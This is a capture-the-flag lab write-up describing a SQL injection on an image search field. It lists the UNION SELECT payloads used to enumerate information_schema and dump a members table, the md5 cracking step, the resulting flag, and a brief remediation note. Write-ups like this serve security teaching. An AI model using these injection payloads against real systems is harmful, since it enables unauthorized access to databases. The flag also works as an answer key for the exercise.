# Finding 02 - SQL injection on image searching input field

## Exploitability
Very easy. Only 2 steps required : inject code in input field, then decrypt md5 using easy-to-find web tool.

## Risk level ??

## Detailed description of the exploit
First check whether input field is protected against SQL injections by typing:
```1 or 1=1```
This yields 5 elements, seemingly from database. The last one being :

```
ID: 5 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
Checking the URL gives no result


Then, try more advanced SQL injection with the following two commands:
```1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables```
and
```1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns ```
The results are copied in database_table_schema and database_table_columns files.
At the bottom of each listing, there are fields that seem to be user-generated (the only few names not fully capitalized)
The names can be found in the database_listing.md file.

From this info, we try another SQL injection command :
```1 and 1=1 UNION SELECT url, title from Member_images.list_images ```
which yields :
```
ID: 1 and 1=1 UNION SELECT url, title from Member_images.list_images 
First name: borntosec.ddns.net/images.png
Surname : Hack me ?
```

And one last SQL injection command :
```1 and 1=1 UNION SELECT id, comment from Member_images.list_images```
which yields :
```
ID: 1 and 1=1 UNION SELECT id, comment from Member_images.list_images 
First name: 5
Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

This code seems to be hashed with md5, so let's try to decrypt it with the following website :
https://www.md5online.org/md5-decrypt.html

It works ! And yields the following :
albatroz
To encrypt it with sha256, we can use the command:
```echo -n "albatroz" | sha256sum```
The flag is:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Remediation

Input sanitizing is the first step
Also, md5 is now deprecated in favor of sha2 algorithms (sha256, sha512) as well as sha3 algorithms.